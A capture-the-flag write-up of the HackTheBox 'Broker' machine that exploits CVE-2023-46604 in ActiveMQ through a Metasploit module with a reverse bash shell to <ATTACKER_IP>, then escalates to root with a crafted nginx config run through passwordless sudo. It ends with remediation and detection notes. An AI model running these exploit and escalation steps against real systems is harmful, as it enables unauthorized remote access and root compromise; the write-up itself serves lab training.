# Broker — HTB Easy, Linux

**By d4rkgunn3r / Dylan Senez — Authorized laboratory assessment**

**Attack path:** ActiveMQ enumeration → CVE-2023-46604 OpenWire RCE → shell as `activemq` → passwordless sudo `nginx` → attacker-controlled nginx config → root file access

> **Colour key:** **ATTACKER** blocks run on your host. **TARGET** blocks run inside the HTB machine once you have a shell.

### Reproducibility notes

- Flag contents are intentionally redacted.
- The retained session records an initial payload mismatch; the successful Linux payload is shown because that failure is useful for reproduction.

---

## 02 — Scope

| Field | Detail |
| --- | --- |
| Machine | Broker / HTB, Easy, Linux |
| Target IP (recorded run) | `10.129.13.29` |
| Starting access | Unauthenticated |
| Primary service | Apache ActiveMQ 5.15.15 / OpenWire 61616 |
| Objective | Obtain user and root proof in the authorized HTB lab |

## 03 — External recon

**ATTACKER**

```bash
nmap -sV -sC -p- 10.129.13.29 -T4 --min-rate 5000 -oA Broker
```

Critical result:

```text
61616/tcp open  apachemq  ActiveMQ OpenWire transport 5.15.15
```

## 04 — ActiveMQ RCE

**ATTACKER**

```text
msfconsole
use exploit/multi/misc/apache_activemq_rce_cve_2023_46604
set RHOST 10.129.13.29
set LHOST <ATTACKER_IP>
set SRVPORT 8081
set target 1
set payload cmd/unix/reverse_bash
run
```

During the original run, a local port conflict and an incorrect OS payload were corrected before the successful Linux shell opened as `activemq`.

## 05 — User proof

```bash
whoami
id
cat /home/activemq/user.txt
```

Flag content is omitted.

## 06 — Sudo enumeration

```bash
sudo -l
```

Relevant rule:

```text
(ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

Because nginx accepts an arbitrary configuration path, the permission can be repurposed to serve the filesystem through a root-owned worker.

## 07 — Privilege escalation with nginx

```bash
cat > /tmp/privesc.conf <<'EOF'
user root;
events {
    worker_connections 1024;
}
http {
    server {
        listen 1337;
        root /;
        autoindex on;
    }
}
EOF

sudo /usr/sbin/nginx -c /tmp/privesc.conf
curl http://127.0.0.1:1337/root/root.txt
```

Flag output is redacted.

## 08 — Vulnerability summary & remediation

| # | Finding | Asset | Rating |
| --- | --- | --- | --- |
| 1 | Apache ActiveMQ 5.15.15 vulnerable to CVE-2023-46604 | OpenWire/61616 | Critical |
| 2 | Passwordless unrestricted nginx execution enables privileged file access | sudoers | Critical |

### Remediations

- Upgrade ActiveMQ to a patched supported release.
- Restrict OpenWire and management ports to trusted broker clients and admin networks.
- Disable unused protocols and require authentication where supported.
- Remove passwordless sudo for general-purpose servers such as nginx.
- If privileged nginx operations are required, wrap them in a fixed configuration and validate ownership/permissions.

## 09 — Detection opportunities

- OpenWire exploitation signatures and unexpected outbound staging requests from ActiveMQ.
- Shell process creation beneath the ActiveMQ Java process.
- `sudo /usr/sbin/nginx -c` pointing outside approved configuration directories.
- New loopback HTTP listeners serving filesystem paths.
- Reads of `/root` through nginx access logs.

## 10 — Timeline

1. Nmap identified ActiveMQ 5.15.15 and OpenWire/61616.
2. CVE-2023-46604 was validated.
3. Staging-port conflict and OS payload mismatch were corrected.
4. A reverse shell opened as `activemq`.
5. User proof was collected.
6. `sudo -l` exposed passwordless nginx execution.
7. A malicious nginx configuration served the root filesystem.
8. Root proof was retrieved locally.

**Publication note:** flag values and session-specific secrets have been removed from this shared copy.
